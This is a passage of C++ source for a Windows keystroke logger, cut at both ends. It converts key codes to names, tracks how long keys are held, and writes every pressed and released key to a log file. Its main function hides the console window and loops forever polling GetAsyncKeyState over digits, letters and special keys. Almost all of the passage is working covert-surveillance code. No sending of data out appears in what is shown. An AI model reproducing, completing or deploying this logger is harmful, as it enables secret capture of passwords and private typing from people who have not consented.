            case RightWindowsMeta: *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'W'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; break;
            case ScrollLock: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; break;
            case Select: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case SelectMedia: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; break;
            case Separator: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; break;
            case Shift: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case Key::Sleep: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; break;
            case Spacebar: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; break;
            case StartMail: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; break;
            case SubtracterSymbol: *(keyBuffer + keyBufferLength) = L'-'; keyBufferLength += 1u; break;
            case Unassigned: *(keyBuffer + keyBufferLength) = L'U'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; break;
            case Undefined: *(keyBuffer + keyBufferLength) = L'U'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; break;
            case UpArrow: *(keyBuffer + keyBufferLength) = L'U'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; break;
            case VolumeDown: *(keyBuffer + keyBufferLength) = L'V'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'D'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case VolumeMute: *(keyBuffer + keyBufferLength) = L'V'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case VolumeUp: *(keyBuffer + keyBufferLength) = L'V'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'U'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; break;
            case Zoom: *(keyBuffer + keyBufferLength) = L'Z'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u;
        }
    }

    // Print ... Keys
    inline void printKeys() {
        // Update > Key Buffer Length
        keyBufferLength = 0u;

        // Loop --- NOTE (Lapys) -> Print all Active keys.
        for (unsigned char keyStreamIterator = 0u; activeKeyStreamLength ^ keyStreamIterator; keyStreamIterator += 1u) {
            // Constant > Tracked Active Key (Timeline)
            const KeyTimeline *trackedActiveKey = trackedActiveKeyStream + keyStreamIterator;
            const clock_t trackedActiveKeyTimeline = trackedActiveKey -> getTimeInMilliseconds();

            // Update > Key Buffer
            *(keyBuffer + keyBufferLength) = L'['; keyBufferLength += 1u;
            ::updateKeyBuffer(*(activeKeyStream + keyStreamIterator));

            // Logic
            if (trackedActiveKeyTimeline) {
                // Update > Key Buffer
                *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u;

                // Logic
                if (trackedActiveKeyTimeline < 1000) {
                    // Declaration > (..., Tracked Active Key Timeline)
                    unsigned char keyBufferIterator = 0u;
                    const unsigned short trackedActiveKeyTimeline = trackedActiveKey -> getTimeInMilliseconds();

                    // (Loop > )Update > Key Buffer (Length)
                    *(keyBuffer + keyBufferLength) = L'('; keyBufferLength += 1u;
                    for (unsigned short iterator = trackedActiveKeyTimeline; iterator; iterator /= 10u) keyBufferIterator += 1u;
                    for (unsigned short iterator = trackedActiveKeyTimeline, length = keyBufferIterator; iterator; (iterator /= 10u, length -= 1u)) *(keyBuffer + keyBufferLength + (length - 1u)) = ((wchar_t) (iterator % 10u)) + 48;
                    keyBufferLength += keyBufferIterator;

                    // Update > Key Buffer ...
                    *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L')'; keyBufferLength += 1u;
                }

                else { // NOTE (Lapys) -> Approximate to integer.
                    // Declaration > (..., Tracked Active Key Timeline)
                    unsigned char keyBufferIterator = 0u;
                    const float trackedActiveKeyTimeline = trackedActiveKey -> getTimeInSeconds();

                    // (Loop > )Update > Key Buffer (Length)
                    *(keyBuffer + keyBufferLength) = L'('; keyBufferLength += 1u;
                    for (unsigned long iterator = trackedActiveKeyTimeline; iterator; iterator /= 10uL) keyBufferIterator += 1u;
                    for (unsigned long iterator = trackedActiveKeyTimeline, length = keyBufferIterator; iterator; (iterator /= 10uL, length -= 1uL)) *(keyBuffer + keyBufferLength + (length - 1uL)) = ((wchar_t) (iterator % 10uL)) + 48;
                    keyBufferLength += keyBufferIterator;

                    // Logic
                    if (trackedActiveKeyTimeline - (unsigned long) trackedActiveKeyTimeline) {
                        // (Loop > )Update > Key Buffer
                        *(keyBuffer + keyBufferLength) = L'.'; keyBufferLength += 1u;
                        for (float iterator = (trackedActiveKeyTimeline - (unsigned long) trackedActiveKeyTimeline) * 10.0f; iterator < (10000.0f * 10.0f); iterator *= 10.0f) { *(keyBuffer + keyBufferLength) = ((wchar_t) (((unsigned long) iterator) % 10uL)) + 48; keyBufferLength += 1u; }
                    }

                    // Update > Key Buffer ...
                    *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u;
                    *(keyBuffer + keyBufferLength) = L')'; keyBufferLength += 1u;
                }
            }

            // Update > Key Buffer
            *(keyBuffer + keyBufferLength) = L']'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'('; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'v'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L')'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'\n'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'\r'; keyBufferLength += 1u;
        }

        // Loop --- NOTE (Lapys) -> Print all Reserved keys.
        for (unsigned char releasedKeyStreamIterator = 0u; releasedKeyStreamIterator ^ releasedKeyStreamLength; releasedKeyStreamIterator += 1u) {
            // Update > Key Buffer
            *(keyBuffer + keyBufferLength) = L'['; keyBufferLength += 1u;
            ::updateKeyBuffer(*(releasedKeyStream + releasedKeyStreamIterator));
            *(keyBuffer + keyBufferLength) = L']'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'('; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L')'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'\n'; keyBufferLength += 1u;
            *(keyBuffer + keyBufferLength) = L'\r'; keyBufferLength += 1u;
        }

        // ...; Print
        fileStream.write(keyBuffer, keyBufferLength);
        std::wcout.write(keyBuffer, keyBufferLength);
    }

    // Register Key ...
    inline bool registerKeyAsActive(const Key key) { // NOTE (Lapys) -> Register as Active key and Tracked Active key.
        // Logic
        if (activeKeyStreamLength) {
            // Loop --- NOTE (Lapys) -> Check for duplicate key registry.
            for (unsigned char activeKeyStreamIterator = 0u; activeKeyStreamIterator ^ activeKeyStreamLength; activeKeyStreamIterator += 1u)
                // Logic > ...
                if (key == *(activeKeyStream + activeKeyStreamIterator)) activeKeyStreamIterator = activeKeyStreamLength - 1u;
                else if (activeKeyStreamIterator == activeKeyStreamLength - 1u) {
                    *(activeKeyStream + activeKeyStreamLength) = key; activeKeyStreamLength += 1u;
                    *(trackedActiveKeyStream + trackedActiveKeyStreamLength) = key; trackedActiveKeyStreamLength += 1u;
                }
        }

        else {
            // Update > (Tracked) Active Key Stream
            *activeKeyStream = key; activeKeyStreamLength = 1u;
            *trackedActiveKeyStream = key; trackedActiveKeyStreamLength = 1u;
        }

        // Return
        return true;
    }
    inline bool registerKeyAsReleased(const Key key) {
        // Logic
        if (releasedKeyStreamLength) {
            // Loop --- NOTE (Lapys) -> Check for duplicate key registry.
            for (unsigned char releasedKeyStreamIterator = 0u; releasedKeyStreamIterator ^ releasedKeyStreamLength; releasedKeyStreamIterator += 1u)
                // Logic > ...
                if (key == *(releasedKeyStream + releasedKeyStreamIterator)) releasedKeyStreamIterator = releasedKeyStreamLength - 1u;
                else if (releasedKeyStreamIterator == releasedKeyStreamLength - 1u) { *(releasedKeyStream + releasedKeyStreamLength) = key; releasedKeyStreamLength += 1u; }
        } else { *releasedKeyStream = key; releasedKeyStreamLength = 1u; }

        // Return
        return true;
    }

    // Track ... Keys --- NOTE (Lapys) -> Update the data for all Tracked Active keys.
    inline void trackActiveKeys() {
        // Loop > [Tracked Active Key] > Tick
        for (unsigned char trackedActiveKeyStreamIterator = 0u; trackedActiveKeyStreamIterator ^ trackedActiveKeyStreamLength; trackedActiveKeyStreamIterator += 1u)
        (trackedActiveKeyStream + trackedActiveKeyStreamIterator) -> tick();
    }

    // Unregister Key ...
    inline bool unregisterKeyFromActive(const Key key) { // NOTE (Lapys) -> Unregister as Active key but re-register as Released key.
        // Loop > Logic
        for (unsigned char keyStreamIterator = 0u; activeKeyStreamLength ^ keyStreamIterator; keyStreamIterator += 1u)
        if (key == *(activeKeyStream + keyStreamIterator)) {
            // (Loop > )Update > ...
            activeKeyStreamLength -= 1u; trackedActiveKeyStreamLength -= 1u;
            while (activeKeyStreamLength ^ keyStreamIterator) {
                *(activeKeyStream + keyStreamIterator) = *(activeKeyStream + keyStreamIterator + 1u);
                *(trackedActiveKeyStream + keyStreamIterator) = *(trackedActiveKeyStream + keyStreamIterator + 1u);

                keyStreamIterator += 1u;
            }
            keyStreamIterator = activeKeyStreamLength - 1u;

            // ...
            ::registerKeyAsReleased(key);

            // Return
            return true;
        }

        // Return
        return false;
    }
    inline bool unregisterKeyFromReleased(const Key key) {
        // Loop > Logic
        for (unsigned char releasedKeyStreamIterator = 0u; releasedKeyStreamIterator ^ releasedKeyStreamLength; releasedKeyStreamIterator += 1u)
        if (key == *(releasedKeyStream + releasedKeyStreamIterator)) {
            // (Loop > )Update > ...
            releasedKeyStreamLength -= 1u;
            while (releasedKeyStreamIterator ^ releasedKeyStreamLength) { *(releasedKeyStream + releasedKeyStreamIterator) = *(releasedKeyStream + releasedKeyStreamIterator + 1u); releasedKeyStreamIterator += 1u; }
            releasedKeyStreamIterator = releasedKeyStreamLength - 1u;

            // Return
            return true;
        }

        // Return
        return false;
    }
    inline bool unregisterKey(const Key key) { return ::unregisterKeyFromActive(key) || ::unregisterKeyFromReleased(key); }

/* Main */
int main(void) {
    // ...
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    // Update > File Stream
    fileStream.imbue(std::locale(fileStream.getloc(), new std::codecvt_utf16<wchar_t, 0x10FFFF, static_cast<std::codecvt_mode>(std::consume_header | std::little_endian | std::generate_header)>(1)));
    fileStream.open(fileName, fileMode);

    // ...; Loop
    const unsigned short keySize = 1u << (sizeof(SHORT) * 8u - 1u);
    for (SHORT keyState; true; ) {
        // Logic > ...
        if ((keyState = ::GetAsyncKeyState(0x30))) keyState & keySize ? ::registerKeyAsActive(Digit0) : ::registerKeyAsReleased(Digit0); else ::unregisterKey(Digit0);
        if ((keyState = ::GetAsyncKeyState(0x31))) keyState & keySize ? ::registerKeyAsActive(Digit1) : ::registerKeyAsReleased(Digit1); else ::unregisterKey(Digit1);
        if ((keyState = ::GetAsyncKeyState(0x32))) keyState & keySize ? ::registerKeyAsActive(Digit2) : ::registerKeyAsReleased(Digit2); else ::unregisterKey(Digit2);
        if ((keyState = ::GetAsyncKeyState(0x33))) keyState & keySize ? ::registerKeyAsActive(Digit3) : ::registerKeyAsReleased(Digit3); else ::unregisterKey(Digit3);
        if ((keyState = ::GetAsyncKeyState(0x34))) keyState & keySize ? ::registerKeyAsActive(Digit4) : ::registerKeyAsReleased(Digit4); else ::unregisterKey(Digit4);
        if ((keyState = ::GetAsyncKeyState(0x35))) keyState & keySize ? ::registerKeyAsActive(Digit5) : ::registerKeyAsReleased(Digit5); else ::unregisterKey(Digit5);
        if ((keyState = ::GetAsyncKeyState(0x36))) keyState & keySize ? ::registerKeyAsActive(Digit6) : ::registerKeyAsReleased(Digit6); else ::unregisterKey(Digit6);
        if ((keyState = ::GetAsyncKeyState(0x37))) keyState & keySize ? ::registerKeyAsActive(Digit7) : ::registerKeyAsReleased(Digit7); else ::unregisterKey(Digit7);
        if ((keyState = ::GetAsyncKeyState(0x38))) keyState & keySize ? ::registerKeyAsActive(Digit8) : ::registerKeyAsReleased(Digit8); else ::unregisterKey(Digit8);
        if ((keyState = ::GetAsyncKeyState(0x39))) keyState & keySize ? ::registerKeyAsActive(Digit9) : ::registerKeyAsReleased(Digit9); else ::unregisterKey(Digit9);
        if ((keyState = ::GetAsyncKeyState(0x41))) keyState & keySize ? ::registerKeyAsActive(CharacterA) : ::registerKeyAsReleased(CharacterA); else ::unregisterKey(CharacterA);
        if ((keyState = ::GetAsyncKeyState(0x42))) keyState & keySize ? ::registerKeyAsActive(CharacterB) : ::registerKeyAsReleased(CharacterB); else ::unregisterKey(CharacterB);
        if ((keyState = ::GetAsyncKeyState(0x43))) keyState & keySize ? ::registerKeyAsActive(CharacterC) : ::registerKeyAsReleased(CharacterC); else ::unregisterKey(CharacterC);
        if ((keyState = ::GetAsyncKeyState(0x44))) keyState & keySize ? ::registerKeyAsActive(CharacterD) : ::registerKeyAsReleased(CharacterD); else ::unregisterKey(CharacterD);
        if ((keyState = ::GetAsyncKeyState(0x45))) keyState & keySize ? ::registerKeyAsActive(CharacterE) : ::registerKeyAsReleased(CharacterE); else ::unregisterKey(CharacterE);
        if ((keyState = ::GetAsyncKeyState(0x46))) keyState & keySize ? ::registerKeyAsActive(CharacterF) : ::registerKeyAsReleased(CharacterF); else ::unregisterKey(CharacterF);
        if ((keyState = ::GetAsyncKeyState(0x47))) keyState & keySize ? ::registerKeyAsActive(CharacterG) : ::registerKeyAsReleased(CharacterG); else ::unregisterKey(CharacterG);
        if ((keyState = ::GetAsyncKeyState(0x48))) keyState & keySize ? ::registerKeyAsActive(CharacterH) : ::registerKeyAsReleased(CharacterH); else ::unregisterKey(CharacterH);
        if ((keyState = ::GetAsyncKeyState(0x49))) keyState & keySize ? ::registerKeyAsActive(CharacterI) : ::registerKeyAsReleased(CharacterI); else ::unregisterKey(CharacterI);
        if ((keyState = ::GetAsyncKeyState(0x4A))) keyState & keySize ? ::registerKeyAsActive(CharacterJ) : ::registerKeyAsReleased(CharacterJ); else ::unregisterKey(CharacterJ);
        if ((keyState = ::GetAsyncKeyState(0x4B))) keyState & keySize ? ::registerKeyAsActive(CharacterK) : ::registerKeyAsReleased(CharacterK); else ::unregisterKey(CharacterK);
        if ((keyState = ::GetAsyncKeyState(0x4C))) keyState & keySize ? ::registerKeyAsActive(CharacterL) : ::registerKeyAsReleased(CharacterL); else ::unregisterKey(CharacterL);
        if ((keyState = ::GetAsyncKeyState(0x4D))) keyState & keySize ? ::registerKeyAsActive(CharacterM) : ::registerKeyAsReleased(CharacterM); else ::unregisterKey(CharacterM);
        if ((keyState = ::GetAsyncKeyState(0x4E))) keyState & keySize ? ::registerKeyAsActive(CharacterN) : ::registerKeyAsReleased(CharacterN); else ::unregisterKey(CharacterN);
        if ((keyState = ::GetAsyncKeyState(0x4F))) keyState & keySize ? ::registerKeyAsActive(CharacterO) : ::registerKeyAsReleased(CharacterO); else ::unregisterKey(CharacterO);
        if ((keyState = ::GetAsyncKeyState(0x50))) keyState & keySize ? ::registerKeyAsActive(CharacterP) : ::registerKeyAsReleased(CharacterP); else ::unregisterKey(CharacterP);
        if ((keyState = ::GetAsyncKeyState(0x51))) keyState & keySize ? ::registerKeyAsActive(CharacterQ) : ::registerKeyAsReleased(CharacterQ); else ::unregisterKey(CharacterQ);
        if ((keyState = ::GetAsyncKeyState(0x52))) keyState & keySize ? ::registerKeyAsActive(CharacterR) : ::registerKeyAsReleased(CharacterR); else ::unregisterKey(CharacterR);
        if ((keyState = ::GetAsyncKeyState(0x53))) keyState & keySize ? ::registerKeyAsActive(CharacterS) : ::registerKeyAsReleased(CharacterS); else ::unregisterKey(CharacterS);
        if ((keyState = ::GetAsyncKeyState(0x54))) keyState & keySize ? ::registerKeyAsActive(CharacterT) : ::registerKeyAsReleased(CharacterT); else ::unregisterKey(CharacterT);
        if ((keyState = ::GetAsyncKeyState(0x55))) keyState & keySize ? ::registerKeyAsActive(CharacterU) : ::registerKeyAsReleased(CharacterU); else ::unregisterKey(CharacterU);
        if ((keyState = ::GetAsyncKeyState(0x56))) keyState & keySize ? ::registerKeyAsActive(CharacterV) : ::registerKeyAsReleased(CharacterV); else ::unregisterKey(CharacterV);
        if ((keyState = ::GetAsyncKeyState(0x57))) keyState & keySize ? ::registerKeyAsActive(CharacterW) : ::registerKeyAsReleased(CharacterW); else ::unregisterKey(CharacterW);
        if ((keyState = ::GetAsyncKeyState(0x58))) keyState & keySize ? ::registerKeyAsActive(CharacterX) : ::registerKeyAsReleased(CharacterX); else ::unregisterKey(CharacterX);
        if ((keyState = ::GetAsyncKeyState(0x59))) keyState & keySize ? ::registerKeyAsActive(CharacterY) : ::registerKeyAsReleased(CharacterY); else ::unregisterKey(CharacterY);
        if ((keyState = ::GetAsyncKeyState(0x5A))) keyState & keySize ? ::registerKeyAsActive(CharacterZ) : ::registerKeyAsReleased(CharacterZ); else ::unregisterKey(CharacterZ);
        if ((keyState = ::GetAsyncKeyState(VK_MULTIPLY))) keyState & keySize ? ::registerKeyAsActive(MultiplierSymbol) : ::registerKeyAsReleased(MultiplierSymbol); else ::unregisterKey(MultiplierSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_ADD))) keyState & keySize ? ::registerKeyAsActive(AdderSymbol) : ::registerKeyAsReleased(AdderSymbol); else ::unregisterKey(AdderSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_SUBTRACT))) keyState & keySize ? ::registerKeyAsActive(SubtracterSymbol) : ::registerKeyAsReleased(SubtracterSymbol); else ::unregisterKey(SubtracterSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_DECIMAL))) keyState & keySize ? ::registerKeyAsActive(Decimal) : ::registerKeyAsReleased(Decimal); else ::unregisterKey(Decimal);
        if ((keyState = ::GetAsyncKeyState(VK_DIVIDE))) keyState & keySize ? ::registerKeyAsActive(DividerSymbol) : ::registerKeyAsReleased(DividerSymbol); else ::unregisterKey(DividerSymbol);
        if ((keyState = ::GetAsyncKeyState(VK_LMENU))) keyState & keySize ? ::registerKeyAsActive(LeftAlternate) : ::registerKeyAsReleased(LeftAlternate); else ::unregisterKey(LeftAlternate);
        if ((keyState = ::GetAsyncKeyState(VK_RMENU))) keyState & keySize ? ::registerKeyAsActive(RightAlternate) : ::registerKeyAsReleased(RightAlternate); else ::unregisterKey(RightAlternate);
        if ((keyState = ::GetAsyncKeyState(VK_MENU))) keyState & keySize ? ::registerKeyAsActive(Alternate) : ::registerKeyAsReleased(Alternate); else ::unregisterKey(Alternate);
        if ((keyState = ::GetAsyncKeyState(VK_APPS))) keyState & keySize ? ::registerKeyAsActive(Application) : ::registerKeyAsReleased(Application); else ::unregisterKey(Application);
        if ((keyState = ::GetAsyncKeyState(VK_ATTN))) keyState & keySize ? ::registerKeyAsActive(Attention) : ::registerKeyAsReleased(Attention); else ::unregisterKey(Attention);
        if ((keyState = ::GetAsyncKeyState(VK_BACK))) keyState & keySize ? ::registerKeyAsActive(Backspace) : ::registerKeyAsReleased(Backspace); else ::unregisterKey(Backspace);
        if ((keyState = ::GetAsyncKeyState(VK_BROWSER_BACK))) keyState & keySize ? ::registerKeyAsActive(BrowserBackFeed) : ::registerKeyAsReleased(BrowserBackFeed); else ::unregisterKey(BrowserBackFeed);
